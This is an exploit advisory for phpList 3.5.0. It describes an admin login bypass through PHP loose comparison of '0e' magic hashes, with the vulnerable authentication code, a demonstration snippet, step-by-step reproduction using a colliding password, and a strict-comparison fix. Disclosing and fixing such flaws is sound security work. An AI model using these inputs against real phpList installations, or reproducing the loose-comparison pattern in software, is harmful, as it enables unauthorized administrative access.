# Exploit Author: Suvadip Kar
# Author Contact: https://twitter.com/spidersec
# Vendor Homepage: https://www.phplist.org
# Software Link: https://www.phplist.org/download-phplist/
# Version: 3.5.0
# Tested on: Linux
# CVE : N/A

Background of the Vulnerability :

Php loose comparison &#039;==&#039; compares two operands by converting them to integers even if they are strings.

EXAMPLE CODE:

 <?php
 var_dump(hash(&#039;sha256&#039;, &#039;TyNOQHUS&#039;) == &#039;0e66298694359207596086558843543959518835691168370379069085300385&#039;);
 var_dump(hash(&#039;sha256&#039;, &#039;34250003024812&#039;) == &#039;0e66298694359207596086558843543959518835691168370379069085300385&#039;);
 ?>

OUTPUT:

bool(true)
bool(true)

Vulnerable code:

GITHUB: https://github.com/phpList/phplist3/blob/master/public_html/lists/admin/phpListAdminAuthentication.php
-----
if(empty($login)||($password=="")){
    return array(0, s(&#039;Please enter your credentials.&#039;));
}
if ($admindata[&#039;disabled&#039;]) {
    return array(0, s(&#039;your account has been disabled&#039;));
}
if (//Password validation.
    !empty($passwordDB) && $encryptedPass == $passwordDB // Vulnerable because loose comparison is used
)
    return array($admindata[&#039;id&#039;], &#039;OK&#039;);
 else {
    if (!empty($GLOBALS[&#039;admin_auth_module&#039;])) {
        Error(s(&#039;Admin authentication has changed, please update your admin module&#039;),
            &#039;https://resources.phplist.com/documentation/errors/adminauthchange&#039;);
        return;
        }
return array(0, s(&#039;incorrect password&#039;));

}
-------

Steps to reproduce:

 1. Set the string &#039;TyNOQHUS&#039; as password for username &#039;admin&#039;. Its sha256 value is 0e66298694359207596086558843543959518835691168370379069085300385.

 2. Now navigate to endpoint &#039;/admin&#039; and try to login with username &#039;admin&#039; password &#039;TyNOQHUS&#039;.

 3. User Logged in with valid password.

 4. Now logout from the application and try to login with username &#039;admin&#039; password &#039;34250003024812&#039;.

 5. User Logged in, without valid password.

 6. Authentication bypassed because of PHP loose comparison.

 FIX: This vulnerability can be fixed by using strict comparison (===) in place of loose comparison.
 -----
 if(empty($login)||($password=="")){
     return array(0, s(&#039;Please enter your credentials.&#039;));
 }
 if ($admindata[&#039;disabled&#039;]) {
     return array(0, s(&#039;your account has been disabled&#039;));
 }
 if (//Password validation.
     !empty($passwordDB) && $encryptedPass === $passwordDB // Fixed by using strict comparison &#039;===&#039;.
 )
     return array($admindata[&#039;id&#039;], &#039;OK&#039;);
  else {
     if (!empty($GLOBALS[&#039;admin_auth_module&#039;])) {
         Error(s(&#039;Admin authentication has changed, please update your admin module&#039;),
             &#039;https://resources.phplist.com/documentation/errors/adminauthchange&#039;);
         return;
         }
 return array(0, s(&#039;incorrect password&#039;));

 }
 -------

Additional Resource: https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf

